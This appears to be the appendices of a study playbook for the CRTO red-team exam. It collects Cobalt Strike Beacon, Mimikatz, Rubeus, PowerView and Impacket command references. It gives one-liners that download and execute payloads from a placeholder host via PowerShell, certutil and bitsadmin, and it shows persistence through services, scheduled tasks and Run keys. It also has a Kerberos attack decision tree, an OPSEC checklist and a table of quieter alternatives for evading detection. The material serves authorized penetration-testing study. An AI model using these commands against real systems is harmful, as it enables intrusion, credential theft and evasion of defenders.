| `exit` | Terminate the beacon | Clean up when done |
| `note <text>` | Label the session | 🟢 helps you |
| `clear` | Clear output | Local only |
| `cancel` | Cancel a pending task | — |
| `job` | List long-running jobs | 🟢 |
| `jobkill <id>` | Kill a job | Clean up proxies/scans |
| `ps` | List processes | 🟢 in-memory |
| `kill <pid>` | Kill a process | Visible |
| `cd <dir>` / `pwd` | Change/print directory | 🟢 |
| `ls` | List files | 🟢 |
| `drives` | List drives | 🟢 |
| `reg query <key>` | Registry query | 4688 if shell-backed |

### Execution

| Command | Does | OPSEC |
|---|---|---|
| `run <cmd> [args]` | Run a program without `cmd.exe` | 🟢 quieter than `shell` |
| `shell <cmd> [args]` | Run via `cmd.exe` | 🔊 4688 + command line |
| `execute <cmd>` ⚠ | Execute a program (alias of `run` in some builds) | — |
| `execute-assembly <path> [args]` | Run .NET assembly in a sacrificial process | 🟢 preferred for tooling |
| `powerpick <cmd>` | PowerShell in-process, no `powershell.exe` | 🟢 |
| `powershell <cmd>` | Spawn `powershell.exe` | 🔊 4688/4104 |
| `powershell-import <file>` | Import a script for `powerpick` | Import once |
| `psinject <pid> <arch> <cmd>` | PowerShell in a remote process | Sysmon 8/10 |
| `runas <user> <pass> <cmd>` | Run as another user | 4648 |
| `spawnto x64 <path>` | Process for fork-and-run | Change from default |
| `blockdlls start|stop` | Block non-Microsoft DLLs in children | 🟢 |
| `ppid <pid>` | Set parent PID ⚠ | Lineage spoofing |
| `argue <cmd>` | Spoof process arguments ⚠ | — |

### Injection, spawning, pivoting

| Command | Does | OPSEC |
|---|---|---|
| `spawn <arch> <listener>` | New beacon in a new process | Parent lineage |
| `spawnas <user> <pass> <arch> <listener>` | Spawn as another user | 4648 |
| `inject <pid> <arch> <listener>` | Inject beacon into a process | Sysmon 8/10 |
| `shinject <pid> <arch> <file.bin>` | Inject shellcode | Sysmon 8 |
| `shspawn <arch> <file.bin>` | New process with shellcode | Sysmon 1 |
| `link <host> <pipe>` | Connect to an SMB beacon | 🟢 |
| `connect <host> <port>` | Connect to a TCP beacon | — |
| `unlink` | Disconnect a child | Clean up |
| `socks <port> [socks5 ...]` | SOCKS proxy | Use SOCKS5 |
| `socks stop` | Stop proxy | Clean up |
| `rportfwd <lport> <rhost> <rport>` | Reverse port forward | Opens a listener |
| `rportfwd stop <lport>` | Stop forward | Clean up |
| `rportfwd_local <lport> <rhost> <rport>` ⚠ | Local reverse forward | Opens a listener |
| `portscan <host> <ports>` | Port scan | Egress from beacon process |
| `ssh <user>@<host>` / `ssh-key` | SSH client ⚠ | — |
| `spunnel` / `spunnel_local` ⚠ | Spawn + tunnel | New process |

### Credentials and tokens

| Command | Does | OPSEC |
|---|---|---|
| `mimikatz <args>` | Run Mimikatz in a sacrificial process | 🔊 LSASS |
| `kerberos_ticket_list` | List Kerberos tickets | 🟢 |
| `kerberos_ticket_use <file>` | Use a ticket from file | — |
| `kerberos_ticket_purge` | Purge tickets | Cleanup |
| `hashdump` | Dump SAM hashes | 🔊 LSASS |
| `logonpasswords` | Dump LSASS logon passwords | 🔊🔊 |
| `dcsync <domain> <user>` | DCSync | 🔊 4662 |
| `make_token <dom\user> <pass>` | Netonly token | 4648 |
| `steal_token <pid>` | Steal a process token | Sysmon 10 |
| `token-store steal <pid>` | Save a token | 🟢 |
| `token-store show` | List saved tokens | 🟢 |
| `token-store use <id>` | Use a saved token | 🟢 |
| `token-store remove <id>` | Remove one | Cleanup |
| `token-store remove-all` | Remove all | Cleanup |
| `pth <dom\user> <ntlm>` | Pass-the-hash | 4624 type 3 |

### Collection

| Command | Does | OPSEC |
|---|---|---|
| `screenshot` | Screenshot | User-visible |
| `printscreen` | Screenshot (alias) | — |
| `clipboard` | Read clipboard | High-signal |
| `keylogger` | Start keylogger | 🔊 |
| `desktop` | VNC session ⚠ | Very visible |
| `browserpivot` | Browser pivot ⚠ | — |
| `timestomp <file> <time>` | Change timestamps | Anti-forensics; detectable |

### Files and transfer

| Command | Does | OPSEC |
|---|---|---|
| `upload <local> <remote>` | Upload file | Sysmon 11 |
| `download <remote>` | Download file | — |
| `rm <file>` | Delete file | Cleanup |
| `mkdir <dir>` | Create directory | — |
| `cp <src> <dst>` / `mv <src> <dst>` | Copy/move | — |

### Networking and discovery

| Command | Does | OPSEC |
|---|---|---|
| `net <subcommand>` | `net` commands | 4688 if shell-backed |
| `net logons` | Logged-on users | Medium |
| `net sessions` | SMB sessions | Medium |
| `net shares` | Shares | 🟢 |
| `net computers` | Domain computers | 🟢 |
| `wmic <query>` | WMI query | 4688 |
| `portscan` | Port scan | 🔇 |

### Elevation

| Command | Does | OPSEC |
|---|---|---|
| `getsystem` | SYSTEM via named-pipe impersonation | Medium |
| `elevate uac-schtasks <listener>` | UAC bypass via scheduled task | Artifacts |
| `elevate uac-token-duplication <listener>` | UAC token duplication | Artifacts |
| `elevate svc-exe <listener>` | Elevate via service (BOF) | 7045 |

### Remote execution

| Command | Does | OPSEC |
|---|---|---|
| `jump psexec <host> <listener>` | PsExec session | 🔊 service + binary |
| `jump psexec64 <host> <listener>` | x64 PsExec | 🔊 |
| `jump psexec_psh <host> <listener>` | PsExec via PowerShell | 🔊 |
| `jump winrm <host> <listener>` | WinRM session | Medium |
| `jump winrm64 <host> <listener>` | x64 WinRM | Medium |
| `jump ssh <host> <listener>` | SSH session | — |
| `remote-exec psexec <host> <cmd>` | Run command via PsExec | 🔊 |
| `remote-exec winrm <host> <cmd>` | Run command via WinRM | Medium |
| `remote-exec wmi <host> <cmd>` | Run command via WMI (no output returned) | Medium |

### Arsenal Kit / BOF extras

| Command | Does | Notes |
|---|---|---|
| `ak-settings` | Show/set Artifact Kit options | Rebuild after profile change |
| `amsi_disable` | Disable AMSI for `powerpick`, `execute-assembly`, `psinject` | ⚠ does **not** cover `powershell` |
| `PortBender` ⚠ | Port redirection BOF | Use for relay/port redirection |
| Custom BOFs | `inline-execute` / kit commands | Vary by kit |

---

## Appendix B — Tool reference

### B.1 Mimikatz (via Beacon)

| Command | Purpose |
|---|---|
| `!privilege::debug` | Acquire debug privilege |
| `!sekurlsa::logonpasswords` | Plaintext/NTLM/SHA1 for logon sessions |
| `!sekurlsa::ekeys` | Kerberos AES/RC4 keys |
| `!sekurlsa::tickets` | Tickets in memory |
| `!sekurlsa::dpapi` | DPAPI masterkeys in memory |
| `!sekurlsa::pth /user /domain /ntlm /run` | Pass-the-hash and run |
| `!lsadump::sam` | Local SAM |
| `!lsadump::secrets` | LSA secrets |
| `!lsadump::cache` | Cached domain credentials |
| `!lsadump::lsa /inject /name:krbtgt` | `krbtgt` keys (DC) |
| `!lsadump::dcsync /domain /user` | DCSync one principal |
| `!lsadump::dcsync /domain /all` | DCSync everything |
| `!lsadump::trust /patch` | Trust keys (⚠ not OPSEC-safe) |
| `!vault::list` | Credential Manager entries |
| `!vault::cred /patch` | Decrypt vault entries |
| `dpapi::cred /in:<file>` | Decrypt a credential blob |
| `dpapi::masterkey /in:<file> /rpc` | Decrypt a masterkey via DC |
| `dpapi::chrome /in:<file> /unprotect` | Browser secrets |
| `!crypto::certificates /export` | Export user certs |
| `!crypto::certificates /systemstore:local_machine /export` | Export machine certs |
| `kerberos::golden /user /domain /sid /krbtgt /ptt` | Golden ticket |
| `kerberos::golden /service:cifs /target:<host> /rc4 /sid /user /ptt` | Silver ticket |
| `!misc::skeleton` | Skeleton key (DC) |

**Prefixes:** `!` = elevate to SYSTEM; `@` = impersonate the beacon thread token; no prefix = current context.

### B.2 Rubeus

| Command | Purpose |
|---|---|
| `triage` | Summary of tickets per logon session |
| `klist` | List current tickets |
| `dump /luid:<id> /nowrap` | Dump tickets for a logon session |
| `ptt /ticket:<base64>` | Pass-the-ticket |
| `ptt /luid:<id> /ticket:<base64>` | PTT into a specific session |
| `purge` | Clear tickets |
| `describe /ticket:<base64>` | Decode a ticket |
| `monitor /interval:10 /nowrap` | Watch for new tickets |
| `kerberoast /user:<user> /nowrap` | Roast a user |
| `kerberoast /rc4opsec /nowrap` | Quiet Kerberoast |
| `kerberoast /format:hashcat /outfile:<f>` | Hashcat format |
| `asreproast /user:<user> /nowrap` | AS-REP roast |
| `asktgt /user /rc4|/aes256|/password /domain /dc /opsec /nowrap` | Get a TGT |
| `asktgs /service:<spn> /domain /dc /ticket:<tgt> /nowrap` | Get a service ticket |
| `s4u /user /rc4|/aes256 /impersonateuser /msdsspn /altservice /domain /dc /nowrap` | Constrained delegation |
| `createnetonly /program /domain /username /password [/ticket]` | Create a netonly logon session |
| `hash /password:<p> /user:<u> /domain:<d>` | Derive hashes/AES from a password |
| `golden /aes256 /user /domain /sid [/sids] /nowrap` | Golden ticket |
| `silver /service /aes256 /user /domain /sid /nowrap` | Silver ticket |
| `diamond /tgtdeleg /ticketuser /ticketuserid /groups /krbkey [/sids] /nowrap` | Diamond ticket |
| `tgtdeleg` | Obtain a usable TGT without a password |
| `renew` / `changepw` | Ticket renewal / password change ⚠ |
| `preauthscan` | Find pre-auth-disabled accounts ⚠ |

### B.3 PowerView (quick index)

```
Get-Domain, Get-DomainSID, Get-DomainController, Get-DomainPolicy
Get-DomainUser, Get-DomainGroup, Get-DomainGroupMember, Get-DomainComputer
Get-DomainOU, Get-DomainSite, Get-DomainSubnet, Get-DomainTrust, Get-Forest, Get-ForestTrust
Get-DomainObject, Get-DomainGPO, Get-ObjectAcl, Get-DomainObjectAcl
Find-InterestingDomainAcl, Invoke-ACLScanner
Find-LocalAdminAccess, Find-DomainUserLocation, Invoke-UserHunter
Invoke-ShareFinder, Invoke-FileFinder, Find-DomainShare, Find-InterestingDomainShareFile
Get-NetFileServer, Get-DomainFileServer, Get-DomainDFSShare
Get-NetLocalGroup, Get-NetLocalGroupMember, Get-NetSession, Get-NetLoggedon, Get-NetShare
ConvertFrom-SID, ConvertTo-SID
Set-DomainUserPassword, Add-DomainGroupMember, Add-DomainObjectAcl, Remove-DomainObjectAcl
Set-DomainObject, Set-DomainObjectOwner
New-GPO, New-GPLink, Get-GPO, Set-GPPrefRegistryValue
Get-DomainForeignGroupMember, Find-ForeignGroup, Find-ForeignUser
```

### B.4 SharpDPAPI

| Command | Purpose |
|---|---|
| `masterkeys` | User DPAPI masterkeys |
| `credentials` | User credential blobs |
| `vaults` | Credential Manager vaults |
| `rdg` | RDP saved credentials |
| `machinemasterkeys` | Machine masterkeys |
| `machinecredentials` | Machine credential blobs |
| `certificates /machine` | Machine certificates (CA keys) |

### B.5 Seatbelt

| Group | Contents |
|---|---|
| `-group=system` | OS, hotfixes, services, environment |
| `-group=user` | User, groups, privileges, creds |
| `-group=misc` | Misc (installed apps, firewall, etc.) |
| `-group=browser` | Browser data |
| `-group=all -full` | Everything (loud) |

### B.6 SharpUp

| Command | Purpose |
|---|---|
| `audit` | All privilege-escalation checks |
| `audit ModifiableServices` | Weak service permissions |
| `audit ModifiableScheduledTask` | Writable tasks |
| `audit UnquotedServicePath` | Unquoted paths |
| `audit AlwaysInstallElevated` | MSI policy |
| `audit TokenPrivileges` | Token privileges |

### B.7 SQL

| Tool / command | Purpose |
|---|---|
| `Get-SQLInstanceDomain` | Discover SQL SPNs |
| `Get-SQLConnectionTest -Instance <h>` | Test access |
| `Get-SQLServerInfo -Instance <h>` | Server info |
| `Get-SQLQuery -Instance <h> -Query "<sql>"` | Run a query |
| `Invoke-SQLOSCmd -Instance <h> -Command "<cmd>"` | OS command via xp_cmdshell |
| `Get-SQLServerLinkCrawl -Instance <h>` | Crawl linked servers |
| `SQLRecon /a:wintoken /h:<h> /m:whoami` | SQLRecon context |
| `SQLRecon /a:wintoken /h:<h> /m:query /c:"<sql>"` | SQLRecon query |
| `SQLRecon /a:wintoken /h:<h> /m:impersonate` | List impersonatable logins |
| `SQLRecon /a:wintoken /h:<h> /m:ixpcmd /i:<login> /c:<cmd>` | Impersonate + command |

### B.8 Impacket (Linux / operator side)

| Script | Purpose |
|---|---|
| `GetUserSPNs.py <dom>/<u>:<p> -dc-ip <dc> -request` | Kerberoast |
| `GetNPUsers.py <dom>/ -usersfile <f> -dc-ip <dc> -request` | AS-REP roast |
| `secretsdump.py <dom>/<u>:<p>@<dc>` | DCSync / hive parsing |
| `psexec.py <dom>/<u>:<p>@<host>` | PsExec |
| `wmiexec.py <dom>/<u>:<p>@<host>` | WMI |
| `smbexec.py` | SMB exec |
| `atexec.py` | Scheduled task |
| `dcomexec.py` | DCOM |
| `getTGT.py` / `getST.py` | TGT / service ticket |
| `ticketer.py` | Forge tickets |
| `ntlmrelayx.py` | NTLM relay |
| `smbserver.py` | Host files |

## Appendix C — One-liners

> All of these are for authorized lab/exam use. Prefer `run`/`execute-assembly` over `shell`, and never on a restricted host unless the technique is the point.

### C.1 Download and execute

```powershell
# PowerShell in-memory download
IEX (New-Object Net.WebClient).DownloadString('http://<host>/payload.ps1')
powershell -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://<host>/payload'))"
```

```text
# certutil (LOLBAS)
certutil -urlcache -split -f http://<host>/payload.exe C:\Windows\Temp\payload.exe
```

```text
# bitsadmin
bitsadmin /transfer job /download /priority high http://<host>/payload.exe C:\Windows\Temp\payload.exe
```

### C.2 Encode / decode

```powershell
[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes('whoami'))
[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('<b64>'))
```

```bash
echo -n 'whoami' | base64
echo '<b64>' | base64 -d
```

### C.3 Discovery

```text
# Local admin group members
net localgroup administrators
Get-LocalGroupMember -Group Administrators

# Domain admins (PowerView)
Get-DomainGroupMember -Identity "Domain Admins" -Recurse | select MemberName

# Who is logged on where (noisy)
Invoke-UserHunter -CheckAccess
Find-DomainUserLocation

# Open shares
Invoke-ShareFinder -Verbose

# Password policy (before spraying)
Get-DomainPolicy
net accounts /domain
```

### C.4 Services and tasks

```text
sc qc <service>
sc config <service> binPath= "C:\Windows\Temp\payload.exe"
sc start <service>
sc stop <service>
sc delete <service>

schtasks /create /tn "Updater" /tr "C:\Windows\Temp\payload.exe" /sc onlogon /ru SYSTEM
schtasks /run /tn "Updater"
schtasks /delete /tn "Updater" /f
```

### C.5 Registry

```text
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SYSTEM\CurrentControlSet\Control\Lsa
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v Updater /t REG_SZ /d "C:\Temp\updater.exe" /f
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v Updater /f
```

### C.6 Networking

```text
netstat -anop tcp
net use \\<host>\c$
net view \\<host>
net view /domain:<domain>
Test-NetConnection <host> -Port 445
portscan <host> 445,5985,3389
```

```bash
ssh -D 1080 <user>@<host>
ssh -L 8080:<target>:80 <user>@<host>
ssh -R 8080:localhost:80 <user>@<host>
proxychains4 <tool>
```

### C.7 Kerberos and tickets

```text
klist
klist purge
Rubeus.exe triage
Rubeus.exe dump /luid:0x<id> /nowrap
Rubeus.exe ptt /ticket:<base64>
Rubeus.exe asktgt /user:<u> /aes256:<key> /domain:<d> /dc:<dc> /opsec /nowrap
```

### C.8 SID and name conversion

```powershell
ConvertFrom-SID S-1-5-21-...-512
ConvertTo-SID DOMAIN\user
([System.Security.Principal.NTAccount]"DOMAIN\user").Translate([System.Security.Principal.SecurityIdentifier]).Value
```

### C.9 Cracking

```bash
hashcat -m 1000  ntlm.txt rockyou.txt
hashcat -m 13100 kerberoast.txt rockyou.txt -r rules/best64.rule
hashcat -m 18200 asrep.txt rockyou.txt
hashcat -m 2100  dcc2.txt rockyou.txt
hashcat -m 5600  netntlmv2.txt rockyou.txt
john --format=NT ntlm.txt
```

### C.10 Pivoting

```bash
# proxychains config
# [ProxyList]
# socks5 127.0.0.1 1080

proxychains4 nxc smb <target> -u <user> -p <pass>
proxychains4 impacket-secretsdump <domain>/<user>:<pass>@<target>
```

```text
# Chisel
# Server (operator): chisel server --reverse --port 8080
# Client (target):   chisel client <operator>:8080 R:socks
```

### C.11 ADCS

```bash
certipy find -u <user>@<domain> -p <pass> -dc-ip <dc> -vulnerable -stdout
certipy req -u <user>@<domain> -p <pass> -ca <ca-host>\<ca-name> -template <t> -upn administrator@<domain>
certipy auth -pfx administrator.pfx -dc-ip <dc>
```

```text
Certify.exe find /vulnerable
Certify.exe request /ca:<ca>\<name> /template:<t> /altname:<domain>\Administrator
```

### C.12 Trusts

```text
nltest /domain_trusts /all_trusts
Get-DomainTrust
Get-ForestTrust
Get-DomainForeignGroupMember -Domain <trusted>
```

---

## Appendix D — Ports, services, and protocols

| Port | Service | Use in an exam |
|---|---|---|
| 53 | DNS | Enumeration; DNS beacon |
| 80 | HTTP | Egress, ADCS web enrolment |
| 88 | Kerberos | TGT/TGS, Kerberoast |
| 135 | MSRPC | WMI, DCOM, RPC |
| 137–139 | NetBIOS | Legacy SMB |
| 389 | LDAP | AD queries |
| 443 | HTTPS | Egress, ADCS |
| 445 | SMB | Shares, PsExec, SMB beacons |
| 464 | kpasswd | Password changes |
| 593 | RPC over HTTP | Exchange/AD |
| 636 | LDAPS | AD queries |
| 1433 | MSSQL | SQL attacks |
| 3268/3269 | Global Catalog | Forest-wide LDAP |
| 3389 | RDP | Interactive access |
| 5985/5986 | WinRM | WinRM lateral movement |
| 9389 | AD Web Services | ADWS |
| 47001 | WinRM | WinRM |
| 49152–65535 | Dynamic RPC | DCOM/WMI pivoting |

**Protocol notes**
- **Kerberos requires FQDN**, not IP. Use `cifs/<host-fqdn>`.
- **SMB signing** may block some relay/tamper paths.
- **WinRM** requires admin or `Remote Management Users`.
- **LDAP** queries are cheap; session enumeration over SMB is not.
- **ADCS web enrolment** is HTTP/HTTPS; ESC8 relays NTLM there.

## Appendix E — Kerberos attack decision tree

```text
Do you have a domain foothold?
├─ No → obtain initial access (phishing / credentials / exposed service)
└─ Yes
   ├─ Need credentials?
   │  ├─ Accounts with SPNs .................. Kerberoast → crack (m 13100)
   │  ├─ Pre-auth disabled .................. AS-REP roast → crack (m 18200)
   │  ├─ Dangerous ACL ...................... ForceChangePassword / targeted Kerberoast
   │  ├─ Delegation configured .............. S4U2Self/Proxy, RBCD, shadow creds
   │  ├─ ADCS misconfiguration .............. request cert → TGT
   │  ├─ LAPS readable ...................... local admin password
   │  └─ Credentials in SYSVOL/files ........ cpassword / config files
   │
   ├─ Have credentials, need Domain Admin?
   │  ├─ DCSync rights ...................... DCSync krbtgt → golden/diamond
   │  ├─ WriteDacl on domain ................ grant DCSync → DCSync
   │  ├─ ADCS ESC1/ESC6/ESC4 ................ cert as admin → TGT
   │  ├─ Unconstrained delegation ............ coerce DC → TGT
   │  ├─ Local admin reuse .................. lateral → LSASS/SAM → DA creds
   │  ├─ GPO control ........................ push payload/task to Tier 0
   │  └─ MSSQL sysadmin/links ............... xp_cmdshell → host → creds
   │
   ├─ Have DA, need persistence?
   │  ├─ krbtgt keys ........................ golden / diamond ticket
   │  ├─ CA private key ..................... forged certificate (DPERSIST-1)
   │  ├─ DSRM / AdminSDHolder / SID history . domain persistence
   │  └─ ACL backdoor ....................... DCSync for a controlled user
   │
   ├─ Need a specific host/service?
   │  ├─ Service account key ................ silver ticket
   │  ├─ Write on computer object ............ RBCD → S4U
   │  ├─ WinRM/SMB admin .................... jump winrm64 / link
   │  └─ Share access ....................... \\host\c$
   │
   └─ Need another domain?
      ├─ Child → parent ..................... golden with /sids (EA SID)
      ├─ Inbound trust ...................... foreign group → cross-domain TGS
      └─ Outbound trust ..................... trust key → asktgt as TRUST$
```

---

## Appendix F — Detection quick reference: action → event

| Your action | Most likely evidence | Quieter alternative |
|---|---|---|
| `shell whoami` | 4688 + command line | `getuid` / `run` |
| `powershell -enc` | 4688, 4104 | `execute-assembly` / `powerpick` |
| `execute-assembly` | Sysmon 1, 7 | Custom `spawnto`, `blockdlls` |
| `mimikatz sekurlsa` | Sysmon 10 on LSASS, Defender ASR | DPAPI / tickets / tokens |
| `hashdump` | Sysmon 10 | `reg save` offline |
| `dcsync` | 4662 replication GUIDs | One account, once |
| `kerberoast` | 4769 RC4 (`0x17`) | `/rc4opsec`, few targets |
| `asreproast` | 4768 pre-auth off | Low volume |
| Golden ticket | TGT anomalies, no 4768 | Diamond, AES |
| Silver ticket | Service-side logon | Scope to one service |
| `pth` | 4624 type 3 + 4776 NTLM | `asktgt` AES |
| `make_token` | 4648 | `steal_token` |
| PsExec jump | 7045/4697 + service binary | WinRM, SMB beacon |
| WinRM jump | 4624 type 3, WSMan | `link` |
| WMI exec | 4688 parent `WmiPrvSE.exe` | WinRM |
| Scheduled task | 4698/4702 | Existing autostart |
| Service create | 7045/4697 | — |
| ACL change | 5136 | Narrow right, revert |
| RBCD / shadow creds | 5136 | Remove after |
| GPO change | 5136 + SYSVOL | — |
| LSASS dump file | Sysmon 11 | In-memory only |
| `wevtutil cl` | 1102 | Never |
| Disable Defender | 5001 / 5007 | Never |
| Beacon egress | Sysmon 3 / WFP 5156 | Redirector, believable process |
| SMB beacon | Sysmon 17/18 | Non-default pipe |
| Port forward | WFP 5156, `netstat` | Existing allowed port |
| Firewall rule | 4946/4947, registry | Avoid |
| `.NET` assembly from disk | Sysmon 11 + 7 | `execute-assembly` from memory |

---

## Appendix G — Pre-submit OPSEC checklist

Copy this into your notes and tick it before you submit.

### C2 and infrastructure

- [ ] Non-default malleable profile (URIs, headers, user-agent)
- [ ] Non-default port and Host header
- [ ] `sleep` ≥ 60s with jitter on persistent beacons
- [ ] Non-default `spawnto` (not `rundll32.exe`)
- [ ] Non-default SMB pipe name
- [ ] `blockdlls start` used where appropriate
- [ ] Stageless payloads where possible
- [ ] Redirector/CDN in front of the team server
- [ ] `killdate` set
- [ ] One slow lifeline beacon; short-lived sessions for work

### Execution and collection

- [ ] No `shell` used for anything that could be `run`/`execute-assembly`
- [ ] No `powershell.exe` spawned unnecessarily
- [ ] No `rundll32.exe` parents left running
- [ ] No LSASS access on restricted/Tier-0 hosts
- [ ] No credential dumps left on disk
- [ ] No keylogger/screenshot left running
- [ ] No `wevtutil`/log clearing
- [ ] No Defender/AMSI policy changes

### Lateral movement and pivots

- [ ] Minimum number of hops to the objective
- [ ] No PsExec services left behind
- [ ] No scheduled tasks left behind
- [ ] No SMB payloads left on admin shares
- [ ] SOCKS5, not SOCKS4
- [ ] All `socks`, `rportfwd`, `link`, tunnels closed
- [ ] Firewall rules removed
- [ ] No unexpected egress from odd processes

### Directory and persistence

- [ ] ACL changes reverted
- [ ] RBCD attribute removed
- [ ] Shadow credentials removed
- [ ] GPO changes and links removed
- [ ] GPO-created tasks/scripts removed
- [ ] LAPS expiry restored (if changed)
- [ ] No golden/skeleton/DSRM persistence unless required
- [ ] No new domain users/groups unless required

### Final

- [ ] Objective achieved and evidence captured
- [ ] Action log complete
- [ ] Restricted-host list re-read
- [ ] No beacon still calling home
- [ ] Ready to pause/submit

---

## Appendix H — Tool paths and file transfer

### H.1 Common lab paths (Windows attack host)

```text
C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe
C:\Tools\PowerSploit\Recon\PowerView.ps1
C:\Tools\PowerSploit\Privesc\Get-GPPPassword.ps1
C:\Tools\SharpHound\SharpHound.exe
C:\Tools\Seatbelt\Seatbelt\bin\Release\Seatbelt.exe
C:\Tools\SharpUp\SharpUp\bin\Release\SharpUp.exe
C:\Tools\Certify\Certify\bin\Release\Certify.exe
C:\Tools\SharpDPAPI\SharpDPAPI\bin\Release\SharpDPAPI.exe
C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe
C:\Tools\PowerUpSQL\PowerUpSQL.ps1
C:\Tools\StandIn\StandIn\bin\Release\StandIn.exe
C:\Tools\ForgeCert.exe
C:\Tools\LAPSToolkit\LAPSToolkit.ps1
C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe
C:\Tools\winPEAS\winPEASx64.exe
C:\Tools\PowerLurk.ps1
```

### H.2 Writable locations on targets

```text
C:\Windows\Temp\
C:\Windows\Tasks\          # commonly writable, inside an AppLocker-allowed path
C:\ProgramData\
%TEMP%                     # user context
%APPDATA%                  # user context
```

### H.3 Transfer methods

| Method | Command | Notes |
|---|---|---|
| Beacon | `upload <local> <remote>` / `download <remote>` | Preferred |
| PowerShell | `IEX (New-Object Net.WebClient).DownloadString(...)` | 4104/4688 |
| certutil | `certutil -urlcache -split -f <url> <path>` | LOLBAS |
| bitsadmin | `bitsadmin /transfer job /download /priority high <url> <path>` | LOLBAS |
| SMB | `copy \\<host>\share\file .` | Network logon |
| Base64 | `certutil -encode` + paste | For small files |
| Reverse port forward | `rportfwd` + HTTP | For target→operator |

**OPSEC:** every method leaves a file or a network connection. Delete transfers, and avoid `IEX` on hosts with script-block logging.

---

## Appendix I — Troubleshooting master table

| Symptom | First checks | Likely fix |
|---|---|---|
| No beacon | Egress, listener, arch | `Test-NetConnection`; switch port; rebuild payload |
| Beacon dies immediately | AV/EDR | `spawnto`, `blockdlls`, stageless, artifact kit |
| `execute-assembly` fails to load | Path/arch | x64 build; verify path; check `job` |
| Assembly runs, no output | AV truncation / wrong args | Smaller tool; check args; test in lab |
| Mimikatz fails | Not SYSTEM / LSASS protected | `getsystem`; try another source |
| `getsystem` fails | No SeImpersonate | Potato family |
| Access denied on `c$` | Not local admin | `Find-LocalAdminAccess`; token theft |
| `jump` fails | SMB/WinRM blocked, FQDN | `portscan`; use FQDN |
| Kerberos SPN error | IP instead of FQDN | Use `cifs/<fqdn>` |
| Clock skew | Time mismatch | Sync with DC |
| DCSync denied | Missing replication rights | Check BloodHound ACLs |
| Golden ticket rejected | Wrong SID/key/AES | Verify; use AES256 |
| Certify finds nothing | Wrong CA/domain/creds | `cas`; `-domain`; alternate creds |
| Cert request denied | Enrolment rights/approval | ESC7 or different template |
| SOCKS works, tools fail | Proxy/DNS | proxychains; FQDN; DNS to DC |
| `rportfwd` unreachable | Firewall | Check `netstat`; avoid new rules |
| AppLocker blocks | Policy | Allowed path/LOLBAS |
| AMSI blocks | Signature | `execute-assembly`; vary bypass |
| PowerShell in CLM | Constrained mode | .NET / non-PS payload |
| SQL xp_cmdshell fails | Disabled / no sysadmin | Enable; impersonate; link |
| BloodHound no path | Stale data | Re-collect |
| Task/service runs but no effect | Payload/arch/path | Test payload manually |
| Beacon lost after reboot | No persistence | Re-establish via initial access |

---

## Sources and further reading

This playbook was compiled from public material; it does not reproduce Zero Point Security's paid course content.

**Official / course**

- Zero Point Security — Red Team Ops: <https://training.zeropointsecurity.co.uk/courses/red-team-ops>
- Zero Point Security — Red Team Ops II: <https://training.zeropointsecurity.co.uk/courses/red-team-ops-ii>
- Cobalt Strike documentation (HelpSystems / Fortra): <https://hstechdocs.helpsystems.com/manuals/cobaltstrike/>

**Public notes and reviews (used to validate scope and OPSEC themes)**

- An0nUD4Y — CRTO Notes / Cheatsheet: <https://github.com/An0nUD4Y/CRTO-Notes>
- dr34mhacks — CRTO CheatSheet: <https://github.com/dr34mhacks/CRTO-CheatSheet>
- 0xn1k5 — Red Teaming / CRTO notes: <https://github.com/0xn1k5/Red-Teaming>
- robinx0 — CRTO review: <https://robinx0.github.io>
- loland.cv — CRTO review (2025): <https://loland.cv>
- parad0x — CRTO experience (2025): <https://medium.com/@_parad0x>
- razzlemouse — CRTO honest review (2025): <https://razzlemouse.medium.com>

**Tool documentation**

- Mimikatz: <https://github.com/gentilkiwi/mimikatz>
- Rubeus: <https://github.com/GhostPack/Rubeus>
- PowerView / PowerSploit: <https://github.com/PowerShellMafia/PowerSploit>
- BloodHound / SharpHound: <https://github.com/BloodHoundAD/BloodHound>
- Certify: <https://github.com/GhostPack/Certify>
- Certipy: <https://github.com/ly4k/Certipy>
- SharpDPAPI: <https://github.com/GhostPack/SharpDPAPI>
- Seatbelt / SharpUp: <https://github.com/GhostPack>
- Impacket: <https://github.com/fortra/impacket>
- LOLBAS: <https://lolbas-project.github.io>

**Disclaimer:** use only against systems you are authorized to test. The CRTO exam permits the use of your own notes and tools inside its lab; this document is intended for that context and for study.
